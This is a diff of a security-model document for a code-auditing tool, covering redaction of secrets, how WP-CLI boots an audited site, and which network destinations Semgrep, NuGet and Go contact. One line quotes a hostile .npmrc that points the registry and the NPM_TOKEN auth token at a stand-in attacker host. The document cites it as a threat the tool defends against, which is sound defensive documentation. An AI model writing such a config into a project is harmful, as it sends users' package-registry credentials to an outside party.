@@ -71,7 +71,10 @@ their respective projects.
 - **Secrets stay redacted.** gitleaks runs with `--redact`; a credential
   finding's snippet is cleared before it is stored, and cleared again before an
   exported report, a GitHub issue or the dashboard shows it. `suggest_fix`
-  never reads a credential finding's file back. The one exception is opt-in:
+  never reads a credential finding's file back, and in the source it quotes
+  around any other finding it withholds every line a credential finding of
+  the project points at and every line the hooks' secret detector finds one
+  on (`redacted_lines`), as the LLM scan's briefs do. The one exception is opt-in:
   `verify_live` (below) reads the value from a private temporary report, sends
   it only to its own provider, and deletes the report.
 - **A project cannot switch the protective hooks off.** In a project's
@@ -508,6 +511,21 @@ their respective projects.
   was started with reaches it. It is still the repository's code, running as
   you, with your files: run `create_fix_pr` only on a repository whose tests
   you would run yourself.
+- **WP-CLI boots the site it audits — without its plugins and theme.**
+  `wp_audit` (every mode), `wp_report`'s plugin kind and `wp_vuln_check` with
+  an install path run WP-CLI, which runs the site's PHP to answer from its
+  database. Every call passes `--skip-plugins --skip-themes`, names the site
+  with `--path` and starts in a temporary directory of its own holding an
+  empty `wp-cli.yml` — so the site's `wp-cli.yml` / `wp-cli.local.yml`, whose
+  `require:` WP-CLI would load as PHP, is never read — and gets the test
+  command's allowlisted environment above plus `WP_CLI_*`, `PHPRC`,
+  `PHP_INI_SCAN_DIR` and the proxy variables (`mcp/src/wordpress/wpCli.ts`).
+  What WP-CLI cannot skip still runs: the site's `wp-config.php` (`wp config
+  get` evaluates it too), its WordPress core files, its must-use plugins and
+  its drop-ins (`wp-content/db.php`, `object-cache.php`,
+  `advanced-cache.php`). On a site copied off a compromised server those may
+  be altered too: read its code first (`scan_wordpress`), and run the WP-CLI
+  audits only on a copy you would let boot.
 - **A repository never chooses where `create_fix_pr`'s package managers send
   your credentials.** A repository `.npmrc` with `registry=https://attacker/`
   and `//attacker/:_authToken=${NPM_TOKEN}` made `npm outdated`, `npm ci`,
@@ -621,7 +639,7 @@ project's own build and test commands.
 
 | Destination | Who triggers it | When |
 | --- | --- | --- |
-| Semgrep registry (`semgrep.dev`) — rules download **and usage metrics to Semgrep Inc.** | `scan_sast` and `security_scan_full` (`--config=auto`), `review_pr`, `bug_hunt` (`p/r2c-bug-scan`, `p/security-audit`, optional language packs), `scan_wordpress` (`p/php`, `p/wordpress`), `audit_executive` (through `security_scan_full`, and `scan_wordpress` on a WordPress project), `init_project`'s first-pass status report (`semgrep --config=auto`, when a bash is available) | by default. Semgrep refuses `--config=auto` with metrics off, so `scan_sast`, `security_scan_full`, `review_pr`, `audit_executive` and the CLI's `--local-only` offer `local_only: true`: only rules on disk, `--metrics=off`, nothing sent to Semgrep's registry or metrics endpoint. `bug_hunt` and `scan_wordpress` have no local-only mode; `audit_executive` with `local_only` skips `scan_wordpress` and says so. Semgrep's `--metrics=auto` also sends metrics with local rules when you are logged in to Semgrep, which is how `map_attack_surface` can send them. What Semgrep collects: <https://semgrep.dev/docs/metrics>. `compliance_check` (RGPD pack) and `create_fix_pr`'s autofix always run with `--metrics=off`. |
+| Semgrep registry (`semgrep.dev`) — rules download **and usage metrics to Semgrep Inc.** | `scan_sast` and `security_scan_full` (`--config=auto`), `review_pr`, `bug_hunt` (`p/r2c-bug-scan`, `p/security-audit`, optional language packs), `scan_wordpress` (`p/php`, `p/wordpress`), `audit_executive` (through `security_scan_full`, and `scan_wordpress` on a WordPress project), `init_project`'s first-pass status report (`semgrep --config=auto`, when a bash other than WSL's is available) | by default. Semgrep refuses `--config=auto` with metrics off, so `scan_sast`, `security_scan_full`, `review_pr`, `audit_executive` and the CLI's `--local-only` offer `local_only: true`: only rules on disk, `--metrics=off`, nothing sent to Semgrep's registry or metrics endpoint. `bug_hunt` and `scan_wordpress` have no local-only mode; `audit_executive` with `local_only` skips `scan_wordpress` and says so. Semgrep's `--metrics=auto` also sends metrics with local rules when you are logged in to Semgrep, which is how `map_attack_surface` can send them. What Semgrep collects: <https://semgrep.dev/docs/metrics>. `compliance_check` (RGPD pack) and `create_fix_pr`'s autofix always run with `--metrics=off`. |
 | Semgrep's version check (`semgrep.dev`) | **disabled by dev-guardian**: every Semgrep run gets `SEMGREP_ENABLE_VERSION_CHECK=0` — native runs (`mcp/src/runners/semgrepRun.ts`), the Docker fallback's container (`-e`), `check_toolchain`'s `semgrep --version`, and `init_project`'s status script | never. Measured through a refusing proxy on 1.176.1: `semgrep --version`, and a scan with local rules and `--metrics=off`, each asked for `semgrep.dev` four times with a fresh home; with the variable, neither asked, and the scan's results were the same. |
 | The project's NuGet feeds, and its MSBuild code | `scan_sast` on a .NET project (`dotnet restore --locked-mode`, then `dotnet build`) — **even with `local_only: true`** — and so `security_scan_full`, `audit_executive`, the CLI `scan` and `create_fix_pr`'s re-scans; `deps_audit` (and `audit_executive`, which runs it) and `deps_update_plan` (`dotnet restore`, `dotnet list package`) | when the .NET SDK is installed: for `scan_sast`, whenever a root `.csproj` / `.fsproj` / `.sln` / `.slnx` is present; for `deps_audit` and `deps_update_plan`, for every `.sln` / `.csproj` they find. A restore and a build execute the project's own MSBuild targets. |
 | The Go module proxy (`proxy.golang.org`, or the project's `GOPROXY`) and checksum database (`sum.golang.org`); a Go toolchain download | `scan_sast` on a Go project — gosec loads every package through `go list` — **even with `local_only: true`**, and so `security_scan_full`, `review_pr`, `audit_executive`, the CLI `scan` and `create_fix_pr`'s re-scans; `deps_audit` (govulncheck, which loads the packages the same way) | when gosec and Go are installed and a module's dependencies are not in the module cache; a `GOFLAGS` `-mod=mod` is run as `-mod=readonly`, so `go.mod` and `go.sum` are never rewritten. When `go.mod` names a newer Go and `GOTOOLCHAIN` allows it, `go` downloads that toolchain. With cgo files, `go list` runs the C compiler over them, as a build would. A warm module cache, a `vendor/` directory or `GOPROXY=off` keep it local; a dependency that cannot be loaded is a named partial gap (`Type error`), never a clean package. |
